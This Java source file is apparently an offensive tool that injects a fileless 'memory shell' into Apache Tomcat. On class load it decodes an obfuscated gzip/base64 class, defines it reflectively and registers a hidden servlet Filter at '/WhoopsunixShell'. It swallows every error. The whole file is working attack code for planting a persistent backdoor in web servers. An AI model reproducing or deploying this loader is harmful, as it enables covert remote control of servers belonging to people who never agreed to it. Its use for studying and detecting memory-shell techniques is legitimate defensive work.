package com.demo.memshell.loader;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 * 5-10 全版本
 */
public class FilterThreadLoader {
    private static String gzipObject = "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";
    private static Object object = null;

    private static String NAME = "Whoopsunix";
    private static String PATTERN = "/WhoopsunixShell";

    public FilterThreadLoader() {
    }

    static {
        try {
            getObject();

            // 获取 standardContext
            Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
            if (!isInject(standardContext)) {
                inject(standardContext);
            }

        } catch (Throwable e) {

        }
    }

    public static boolean isInject(Object standardContext) {
        try {
            Object filterDef = invokeMethod(standardContext, "findFilterDef", new Class[]{String.class}, new Object[]{NAME});
            if (filterDef != null) {
                return true;
            }
        } catch (Exception e) {

        }
        return false;
    }

    public static void inject(Object standardContext) {
        // tomcat 7
        // org.apache.catalina.deploy.FilterDef
        // tomcat 8 9
        // org.apache.tomcat.util.descriptor.web.FilterDef
        try {
            if (object == null) {
                return;
            }

            Object filterDef = invokeMethod(standardContext, "findFilterDef", new Class[]{String.class}, new Object[]{NAME});

            // 添加 filterDef
            try {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
            } catch (ClassNotFoundException e) {
                filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            }
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{NAME});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{object.getClass().getName()});
            invokeMethod(filterDef, "setFilter", new Class[]{Class.forName("javax.servlet.Filter")}, new Object[]{object});
            invokeMethod(standardContext, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});

            // 添加 filterMap
            Object filterMap = null;
            try {
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            } catch (ClassNotFoundException e) {
                filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
            }
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{NAME});
            invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{PATTERN});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
            invokeMethod(standardContext, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});

            // 添加 filterConfig
            Map filterConfigs = (Map) getFieldValue(standardContext, "filterConfigs");
            Object filterConfig = getConstructorObject("org.apache.catalina.core.ApplicationFilterConfig", new Class[]{Class.forName("org.apache.catalina.Context"), filterDef.getClass()}, new Object[]{standardContext, filterDef});
            filterConfigs.put(NAME, filterConfig);
        } catch (Exception e) {
        }
    }

    public static void getObject() throws Exception {
        // 动态代理兼容 javax jakarta
        Class filterClass = null;
        try {
            filterClass = Class.forName("jakarta.servlet.Filter");
        } catch (Exception e) {
            try {
                filterClass = Class.forName("javax.servlet.Filter");
            } catch (ClassNotFoundException ex) {

            }
        }

        byte[] bytes = decompress(gzipObject);

        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        Object javaObject = clazz.newInstance();

        object = Proxy.newProxyInstance(filterClass.getClassLoader(), new Class[]{filterClass}, (InvocationHandler) javaObject);
    }


    // tools
    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getTargetObject(String className) throws Exception {
        List<ClassLoader> activeClassLoaders = new FilterThreadLoader().getActiveClassLoaders();

        Class cls = getTargetClass(className, activeClassLoaders);

        // 死亡区域 已检查过的类
        HashSet breakObject = new HashSet();
        breakObject.add(System.identityHashCode(breakObject));

        // 原始类型和包装类都不递归
        HashSet<String> breakType = new HashSet(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));

        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);

        return result;
    }

    /**
     * 递归查找属性
     */
    public static Object getTargetObject(Class targetCls, Object object, HashSet breakObject, HashSet<String> breakType, int maxDepth) {
        // 最大递归深度
        maxDepth--;
        if (maxDepth < 0) {
            return null;
        }

        if (object == null) {
            return null;
        }

        // 寻找到指定类返回
        if (targetCls.isInstance(object)) {
            return object;
        }

        // 获取内存地址，来标识唯一对象
        Integer hash = System.identityHashCode(object);

        if (breakObject.contains(hash)) {
            return null;
        }
        breakObject.add(hash);

        // 获取对象所有 Field
        Field[] fields = object.getClass().getDeclaredFields();
        ArrayList fieldsArray = new ArrayList();
        Class objClass = object.getClass();
        while (objClass != null) {
            Field[] superFields = objClass.getDeclaredFields();
            fieldsArray.addAll(Arrays.asList(superFields));
            objClass = objClass.getSuperclass();
        }
        fields = (Field[]) fieldsArray.toArray(new Field[0]);


        for (Field field : fields) {
            try {
                Class type = field.getType();

                if (breakType.contains(type.getName())) {
                    continue;
                }

                // 获取 Field 值
                field.setAccessible(true);
                Object value = field.get(object);
                Object result = null;

                // 递归查找
                if (value instanceof Map) {
                    // Map 的 kv 都要遍历
                    Map map = (Map) value;
                    for (Object o : map.entrySet()) {
                        Map.Entry entry = (Map.Entry) o;
                        result = getTargetObject(targetCls, entry.getKey(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                        result = getTargetObject(targetCls, entry.getValue(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (value instanceof Iterable) {
                    // 集合的元素都要遍历
                    Iterable iterable = (Iterable) value;
                    for (Object o : iterable) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (type.isArray()) {
                    // 数组的元素都要遍历
                    Object[] array = (Object[]) value;
                    for (Object o : array) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else {
                    result = getTargetObject(targetCls, value, breakObject, breakType, maxDepth);
                }

                if (result != null) {
                    return result;
                }
            } catch (Throwable e) {

            }
        }

        return null;
    }


    /**
     * 遍历 ClassLoader 加载目标 Class
     */
    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
        for (ClassLoader activeClassLoader : activeClassLoaders) {
            try {
                return Class.forName(className, true, activeClassLoader);
            } catch (Throwable e) {

            }
        }
        return null;
    }

    /**
     * 获取活跃线程
     */
    public List<ClassLoader> getActiveClassLoaders() throws Exception {
        Set<ClassLoader> activeClassLoaders = new HashSet();

        // 加载当前对象的加载器
        activeClassLoaders.add(this.getClass().getClassLoader());

        // 当前线程的上下文类加载器
        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());

//        // 应用程序类加载器
//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
//        activeClassLoaders.add(systemClassLoader);
//
//        // 扩展类加载器
//        activeClassLoaders.add(systemClassLoader.getParent());

        // 获取线程组
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[threadGroup.activeCount()];
        int count = threadGroup.enumerate(threads, true);
        for (int i = 0; i < count; i++) {
            activeClassLoaders.add(threads[i].getContextClassLoader());
        }

        return new ArrayList(activeClassLoaders);
    }

    public static Object getConstructorObject(String className, Class[] cls, Object[] object) {
        try {
            Constructor constructor = Class.forName(className).getDeclaredConstructor(cls);
            constructor.setAccessible(true);
            Object obj = constructor.newInstance(object);
            return obj;
        } catch (Exception e) {

        }
        return null;
    }

}
